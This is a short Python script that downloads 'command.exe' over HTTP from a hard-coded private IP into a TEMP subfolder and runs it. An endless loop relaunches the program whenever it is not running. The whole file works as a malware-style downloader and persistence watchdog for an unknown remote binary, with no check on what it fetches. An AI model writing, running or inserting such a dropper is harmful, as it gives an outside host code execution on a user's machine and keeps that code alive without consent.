import psutil
import os
import requests
import subprocess

#ip
HOST = "192.168.2.63"
#get the temp folder
#create the folder if it doesn't exist
#download the command.exe
#run the command.exe
tmpfolder = os.getenv("TEMP")
assert tmpfolder is not None
folder1 = os.path.join(tmpfolder, "folder1")
if not os.path.exists(folder1):
    os.makedirs(folder1)
#download the command.exe
r = requests.get("http://" + HOST + "/command.exe")
with open(os.path.join(folder1, "command.exe"), "wb") as f:
    f.write(r.content)
#run the command.exe
while True:

    running = False

    for proc in psutil.process_iter(["name"]):
        if proc.info["name"] == "command.exe":
            running = True
            break
    if not running:
        subprocess.Popen([os.path.join(folder1, "command.exe")])
